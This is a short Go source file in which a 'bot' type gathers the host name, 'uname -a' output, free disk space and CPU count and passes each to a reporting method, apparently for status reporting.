package pkg

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

func (bot BOT) threadsNumber() string {
	return strconv.Itoa(bot.cpu * 2)
}

func (bot *BOT) ReportInfo() {
	hName, _ := os.Hostname()
	wd, _ := os.Getwd()
	uname, _ := exec.Command("uname", "-a").Output()
	bot.cpu = runtime.NumCPU()

	freeDiskSpace := func(wd string) uint64 {
		var stat unix.Statfs_t
		unix.Statfs(wd, &stat)
		return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
	}(wd)

	bot.Report("Host Name: " + hName)
	bot.Report("System: " + string(uname))
	bot.Report("Free Disk Space (GB): " + fmt.Sprint(freeDiskSpace))
	bot.Report("Number of CPUs: " + strconv.Itoa(bot.cpu))
	bot.Report("Number of Threads: " + bot.threadsNumber())
}
